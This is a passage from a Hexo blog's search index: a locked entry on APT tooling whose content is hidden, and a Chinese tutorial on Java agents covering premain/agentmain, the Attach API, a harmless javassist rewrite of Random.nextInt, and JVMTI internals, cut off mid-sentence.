<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>APT武器研究</title>
    <link href="/2023/09/09/APT%E6%AD%A6%E5%99%A8%E7%A0%94%E7%A9%B6/"/>
    <url>/2023/09/09/APT%E6%AD%A6%E5%99%A8%E7%A0%94%E7%A9%B6/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="fc55aaaa1a963bd9752e6652d8a5e295a13cdde223e81dc3f9984bb23c95db9b"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>tool</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaagent</title>
    <link href="/2023/09/09/Javaagent/"/>
    <url>/2023/09/09/Javaagent/</url>
    
    <content type="html"><![CDATA[<h1 id="Javaagent"><a href="#Javaagent" class="headerlink" title="Javaagent"></a>Javaagent</h1><h2 id="JVM启动前静态Instrument"><a href="#JVM启动前静态Instrument" class="headerlink" title="JVM启动前静态Instrument"></a>JVM启动前静态Instrument</h2><p>java命令可以指定一个参数javaagent，用于指定一个jar包，这个jar包有如下要求：</p><ol><li>这个jar包的<code>MANIFEST.MF</code>指定<code>Premain-Class</code></li><li><code>Premain-Class</code>指定的类需要实现<code>premain()</code>方法</li></ol><p>premain方法是运行在main方法之前，一个<code>Premain-Class</code>指定类的方法</p><p>在java命令中可以看到如下提示：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">-agentli<span class="hljs-variable">b:</span><span class="hljs-symbol">&lt;libname&gt;</span>[=&lt;选项&gt;]<br>              加载本机代理库 <span class="hljs-symbol">&lt;libname&gt;</span>, 例如 -agentli<span class="hljs-variable">b:hprof</span><br>              另请参阅 -agentli<span class="hljs-variable">b:jdwp</span>=<span class="hljs-keyword">help</span> 和 -agentli<span class="hljs-variable">b:hprof</span>=<span class="hljs-keyword">help</span><br>-agentpath:<span class="hljs-symbol">&lt;pathname&gt;</span>[=&lt;选项&gt;]<br>              按完整路径名加载本机代理库<br>-javaagen<span class="hljs-variable">t:</span><span class="hljs-symbol">&lt;jarpath&gt;</span>[=&lt;选项&gt;]<br>              加载 Java 编程语言代理, 请参阅 java.lang.instrument<br></code></pre></td></tr></table></figure><p>在<code>java.lang.instrument</code>中，提供了一些工具帮助开发人员在Java程序运行时，动态的修改系统中的Class类型，很重要的一个组件就是Javaagent</p><p>我们主要看<code>ClassFileTransformer</code>和<code>Instrumentation</code>这两个类</p><p><code>Premain-Class</code>指定的类需要实现<code>premain()</code>方法必须满足如下两种类型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">premain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span></span><br><span class="hljs-function">    </span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">premain</span><span class="hljs-params">(String agentArgs)</span></span><br></code></pre></td></tr></table></figure><p>JVM会优先加载带<code>Instrumentation</code>签名的方法，没有加载成功会加载第二个方法</p><p>逻辑在<code>sun.instrument.InstrumentationImpl#loadClassAndStartAgent</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    var6 = var5.getDeclaredMethod(var2, String.class, Instrumentation.class);<br>    var8 = <span class="hljs-keyword">true</span>;<br>&#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException var13) &#123;<br>    var7 = var13;<br>&#125;<br><br><span class="hljs-keyword">if</span> (var6 == <span class="hljs-keyword">null</span>) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        var6 = var5.getDeclaredMethod(var2, String.class);<br>    &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException var12) &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>接口<code>Instrumentation</code>定义如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Instrumentation</span> </span>&#123;<br>    <br>    <span class="hljs-comment">//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer, <span class="hljs-keyword">boolean</span> canRetransform)</span></span>;<br><br>    <span class="hljs-comment">//在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer)</span></span>;<br><br>    <span class="hljs-comment">//删除一个类转换器</span><br>    <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">removeTransformer</span><span class="hljs-params">(ClassFileTransformer transformer)</span></span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">isRetransformClassesSupported</span><span class="hljs-params">()</span></span>;<br><br>    <span class="hljs-comment">//在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">retransformClasses</span><span class="hljs-params">(Class&lt;?&gt;... classes)</span> <span class="hljs-keyword">throws</span> UnmodifiableClassException</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">isRedefineClassesSupported</span><span class="hljs-params">()</span></span>;<br><br>    <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">redefineClasses</span><span class="hljs-params">(ClassDefinition... definitions)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span>  ClassNotFoundException, UnmodifiableClassException</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">isModifiableClass</span><span class="hljs-params">(Class&lt;?&gt; theClass)</span></span>;<br><br>    <span class="hljs-meta">@SuppressWarnings(&quot;rawtypes&quot;)</span><br>    Class[] getAllLoadedClasses();<br>  <br>    <span class="hljs-meta">@SuppressWarnings(&quot;rawtypes&quot;)</span><br>    Class[] getInitiatedClasses(ClassLoader loader);<br><br>    <span class="hljs-comment">//获取一个对象的大小</span><br>    <span class="hljs-function"><span class="hljs-keyword">long</span> <span class="hljs-title">getObjectSize</span><span class="hljs-params">(Object objectToSize)</span></span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">appendToBootstrapClassLoaderSearch</span><span class="hljs-params">(JarFile jarfile)</span></span>;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">appendToSystemClassLoaderSearch</span><span class="hljs-params">(JarFile jarfile)</span></span>;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">isNativeMethodPrefixSupported</span><span class="hljs-params">()</span></span>;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setNativeMethodPrefix</span><span class="hljs-params">(ClassFileTransformer transformer, String prefix)</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用javaagent的步骤：</p><ol><li>定义MANIFEST.MF文件，必须设置<code>Premain-Class</code>字段，通常也会加入<code>Can-Redeine-Classes</code>和<code>Can-Retransform-Classes</code>字段</li><li>创建的<code>Premain-Class</code>指定的类，类中必须包含<code>premain</code>方法，方法逻辑自定义</li><li>将<code>premain</code>的类和<code>MANIFEST.MF</code>文件打成jar包</li><li>使用参数<code>-javaagent:/path/to/jar</code></li></ol><p>此时JVM会启动应用前先执行<code>premain</code>方法，大部分的类加载都会通过该方法，部分系统类会先于agent执行，因此可以去拦截用户的类加载。进一步地，使用第三方的字节码编译工具，例如ASM，javaassit可以实现重写类的操作</p><p>示例代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.george.agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DefineTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ClassFileTransformer</span> </span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-keyword">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>        System.out.println(<span class="hljs-string">&quot;premain load Class: &quot;</span> + className);<br>        <span class="hljs-keyword">return</span> classfileBuffer;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PreMainTraceAgent</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">premain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;agentArgs: &quot;</span> + agentArgs);<br>        inst.addTransformer(<span class="hljs-keyword">new</span> DefineTransformer(), <span class="hljs-keyword">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面的类实现了带<code>Instrumentation</code>参数的<code>premain</code>方法，然后调用了<code>addTransformer</code>方法对启动时的类进行拦截</p><p>MANIFEST.MF <strong>最后一行是不可少的空行</strong><br>如果不手动指定MANIFEST，直接使用插件等方式进行打包，默认会生成一个MANIFEST.MF文件</p><p>在resources/META-INF新建：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Manifest-Version:</span> <span class="hljs-number">1.0</span><br><span class="hljs-attr">Premain-Class:</span> <span class="hljs-string">com.george.agent.PreMainTraceAgent</span><br><span class="hljs-attr">Can-Redefine-Classes:</span> <span class="hljs-literal">true</span><br><span class="hljs-attr">Can-Retransform-Classes:</span> <span class="hljs-literal">true</span><br><br></code></pre></td></tr></table></figure><p>给maven插件指定使用自定义MANIFEST.MF</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-jar-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.3.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">archive</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">manifestFile</span>&gt;</span><br>                        src/main/resources/META-INF/MANIFEST.MF<br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">manifestFile</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">archive</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br></code></pre></td></tr></table></figure><p>否则使用&lt;manifestEntries&gt;代替&lt;manifestFile&gt;指定</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">manifestEntries</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Premain-Class</span>&gt;</span>com.george.agent.PreMainTraceAgent<span class="hljs-tag">&lt;/<span class="hljs-name">Premain-Class</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Can-Redefine-Classes</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Can-Redefine-Classes</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Can-Retransform-Classes</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Can-Retransform-Classes</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">manifestEntries</span>&gt;</span><br></code></pre></td></tr></table></figure><p>一个java程序中<code>-javaagent</code>参数的个数是没有限制的，所以可以添加任意多个javaagent，所有的javaagent会按照你定义的顺序执行，例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -javaagent:agent1.jar -javaagent:agent2.jar -jar MyProgram.jar<br></code></pre></td></tr></table></figure><p>程序执行的顺序将会是：</p><p><code>MyAgent1.premain -&gt; MyAgent2.premain -&gt; MyProgram.main</code></p><p>然后随便写一个类运行，比如打印一个hello world后，运行参数加入</p><blockquote><p>-javaagent:D:\program\java\javaagent\target\javaagent-1.0-SNAPSHOT.jar</p></blockquote><p>既然可以拦截，那么就可以修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.george.agent;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DefineTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ClassFileTransformer</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-keyword">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>        System.out.println(<span class="hljs-string">&quot;premain load Class: &quot;</span> + className);<br>        <span class="hljs-keyword">if</span>(className.equals(<span class="hljs-string">&quot;java/util/Random&quot;</span>))&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                ClassPool cp = ClassPool.getDefault();<br>                CtClass ctClass = cp.get(<span class="hljs-string">&quot;java.util.Random&quot;</span>);<br>                CtMethod nextIntM = ctClass.getDeclaredMethod(<span class="hljs-string">&quot;nextInt&quot;</span>);<br>                String methodBody = <span class="hljs-string">&quot;&#123;System.out.println(\&quot;zero!!!\&quot;);\n&quot;</span> +<br>                        <span class="hljs-string">&quot;return next(32);&#125;&quot;</span>;<br>                nextIntM.setBody(methodBody);<br>                <span class="hljs-keyword">byte</span>[] bytecode = ctClass.toBytecode();<br>                ctClass.detach();<br>                <span class="hljs-keyword">return</span> bytecode;<br>            &#125; <span class="hljs-keyword">catch</span> (NotFoundException | CannotCompileException | IOException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> classfileBuffer;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PreMainTraceAgent</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">premain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;agentArgs: &quot;</span> + agentArgs);<br>        inst.addTransformer(<span class="hljs-keyword">new</span> DefineTransformer(), <span class="hljs-keyword">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="JVM启动后动态Instrument"><a href="#JVM启动后动态Instrument" class="headerlink" title="JVM启动后动态Instrument"></a>JVM启动后动态Instrument</h2><p>上面的Instrument是JDK1.5引入的，开发者只能在main加载前进行拦截，在JAVA SE 6的Instrumentation中提供了新的代理操作方法：agentmain，可以在main函数运行之后再运行</p><p>类比premain方法，需要编写一个agentmain方法</p><p><code>Agent-Class</code>指定的类需要实现<code>agentmain()</code>方法必须满足如下两种类型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">agentmain</span> <span class="hljs-params">(String agentArgs, Instrumentation inst)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">agentmain</span> <span class="hljs-params">(String agentArgs)</span></span><br></code></pre></td></tr></table></figure><p>优先加载带<code>Instrumentation</code>签名的方法，没有加载成功会加载第二个方法</p><p>采用attach机制，被代理的目标程序VM有可能很早之前已经启动，当然其所有类已经被加载完成，这个时候需要借助<code>Instrumentation#retransformClasses(Class&lt;?&gt;... classes)</code>让对应的类可以重新转换，从而激活重新转换的类执行<code>ClassFileTransformer</code>列表中的回调</p><p>在模块-依赖中添加<code>tools.jar</code>的依赖，在<code>com.sun.tools.attach</code>中，有两个主要的类实现了Attach API</p><p><code>VirtualMachine</code>和<code>VirtualMachineDescriptor</code>：</p><p>前者可以监控目标JVM，获取系统信息如：内存dump，线程dump，类信息，loadAgent，Attach，Detach；我们可以通过attach方法，传入目标JVM的PID，就能连接到远程JVM；代理类注入操作只是它众多功能中的一个，通过<code>loadAgent</code>方法向JVM注册一个代理程序agent，在该agent的代理程序中会得到一个<code>Instrumentation</code>实例，该实例可以  在class加载前改变class的字节码，也可以在class加载后重新加载。在调用<code>Instrumentation</code>实例的方法时，这些方法会使用<code>ClassFileTransformer</code>接口中提供的方法进行处理</p><p>后者是描述一个JVM的容器类，配合前者完成各种功能</p><p>通过<code>VirtualMachine.attach(PID)</code>，可以连接到目标JVM，之后通过<code>loadAgent(agentJarPath)</code>将agent的jar包注入进程，对应的进程就会调用<code>agentmain</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.george.agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DefineTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ClassFileTransformer</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-keyword">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>        System.out.println(<span class="hljs-string">&quot;sufmain load class&quot;</span> + className);<br>        <span class="hljs-keyword">return</span> classfileBuffer;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SufMainTraceAgent</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">agentmain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span></span>&#123;<br>        inst.addTransformer(<span class="hljs-keyword">new</span> DefineTransformer());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Manifest-Version:</span> <span class="hljs-number">1.0</span><br><span class="hljs-attr">Agent-Class:</span> <span class="hljs-string">com.george.agent.SufMainTraceAgent</span><br><span class="hljs-attr">Can-Redefine-Classes:</span> <span class="hljs-literal">true</span><br><span class="hljs-attr">Can-Retransform-Classes:</span> <span class="hljs-literal">true</span><br><br></code></pre></td></tr></table></figure><p>同样在pom.xml指定使用MANIFEST.MF文件，打成jar包</p><p>测试这里使用自身的JVM进行agent注入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.tools.attach.*;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AttachVirtualMachine</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException </span>&#123;<br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        <span class="hljs-keyword">for</span> (VirtualMachineDescriptor x : list) &#123;<br>            System.out.println(x.displayName());<br>            <span class="hljs-comment">//这里找到自身类并注入</span><br>            <span class="hljs-keyword">if</span>(x.displayName().endsWith(<span class="hljs-string">&quot;AttachVirtualMachine&quot;</span>))&#123;<br>                VirtualMachine vm = VirtualMachine.attach(x.id());<br>                vm.loadAgent(<span class="hljs-string">&quot;D:\\program\\java\\javaattach\\target\\javaattach-1.0-SNAPSHOT.jar&quot;</span>);<br>                vm.detach();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Instrument原理"><a href="#Instrument原理" class="headerlink" title="Instrument原理"></a>Instrument原理</h2><p>Instrument的实现依赖于JVM暴露出来给用户的接口JVMTI(JVM Tool Interface)，JVMTI是基于事件驱动的，JVM每执行到一定的逻辑就会调用一些事件的回调接口（如果有的话），这些接口可以供开发者去扩展自己的逻辑。<code>JVMTIAgent</code>是一个利用<code>JVMTI</code>暴露出来的接口提供了代理启动时加载(agent on load)、代理通过attach形式加载(agent on attach)和代理卸载(agent on unload)功能的动态库。而<code>instrument agent</code>可以理解为一类<code>JVMTIAgent</code>动态库，别名是<code>JPLISAgent(Java Programming Language Instrumentation Services Agent)</code>，也就是<strong>专门为java语言编写的插桩服务提供支持的代理</strong></p><h5 id="启动时加载instrument-agent过程："><a href="#启动时加载instrument-agent过程：" class="headerlink" title="启动时加载instrument agent过程："></a>启动时加载instrument agent过程：</h5><ol><li>创建并初始化 JPLISAgent；</li><li>监听 <code>VMInit</code> 事件，在 JVM 初始化完成之后做下面的事情：<ol><li>创建 InstrumentationImpl 对象 ；</li><li>监听 ClassFileLoadHook 事件 ；</li><li>调用 InstrumentationImpl 的<code>loadClassAndCallPremain</code>方法，在这个方法里会去调用 javaagent 中 MANIFEST.MF 里指定的Premain-Class 类的 premain 方法 ；</li></ol></li><li>解析 javaagent 中 MANIFEST.MF 文件的参数，并根据这些参数来设置 JPLISAgent 里的一些内容。</li></ol><h5 id="运行时加载instrument-agent过程："><a href="#运行时加载instrument-agent过程：" class="headerlink" title="运行时加载instrument agent过程："></a>运行时加载instrument agent过程：</h5><p>通过 JVM 的attach机制来请求目标 JVM 